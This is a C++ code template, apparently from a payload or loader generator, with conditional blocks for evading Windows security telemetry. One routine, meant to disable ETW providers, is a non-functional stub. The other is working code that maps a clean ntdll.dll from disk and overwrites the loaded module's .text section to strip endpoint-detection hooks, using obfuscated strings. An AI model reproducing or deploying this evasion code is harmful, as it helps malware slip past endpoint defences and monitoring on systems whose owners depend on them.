{{#IF ETW_PROVIDER_DISABLE}}
// ETW Provider Disablement - @_xpn
static void bypass_etw_provider_disable() {
    // Disable .NET runtime ETW provider
    using EventUnregister_t = ULONG(WINAPI*)(REGHANDLE);
    HMODULE hAdvapi = LoadLibraryW(obf_wide(L"advapi32.dll"));
    if (!hAdvapi) return;
    auto pEventUnregister = reinterpret_cast<EventUnregister_t>(
        GetProcAddress(hAdvapi, obf("EventUnregister")));
    if (!pEventUnregister) return;

    // Attempt to unregister common ETW providers
    // Provider handles are per-process; we enumerate via NtQuerySystemInformation
    // For simplicity, patch EtwEventWrite as fallback
    (void)pEventUnregister;
}
{{#ENDIF}}

{{#IF ETW_UNHOOK_NTDLL}}
// Fresh ntdll unhooking - @_RastaMouse, @MDSec
static void bypass_etw_unhook_ntdll() {
    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
    if (!hNtdll) return;

    // Map clean ntdll from disk
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    lstrcatW(path, obf_wide(L"\\ntdll.dll"));

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }

    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!clean) { CloseHandle(hMap); CloseHandle(hFile); return; }

    // Find .text section and overwrite
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hNtdll) + dos->e_lfanew);
    auto section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD old;
            LPVOID text_addr = reinterpret_cast<BYTE*>(hNtdll) + section[i].VirtualAddress;
            LPVOID clean_text = reinterpret_cast<BYTE*>(clean) + section[i].VirtualAddress;
            SIZE_T text_size = section[i].Misc.VirtualSize;

            VirtualProtect(text_addr, text_size, PAGE_EXECUTE_READWRITE, &old);
            memcpy(text_addr, clean_text, text_size);
            VirtualProtect(text_addr, text_size, old, &old);
            break;
        }
    }

    UnmapViewOfFile(clean);
    CloseHandle(hMap);
    CloseHandle(hFile);
}
{{#ENDIF}}

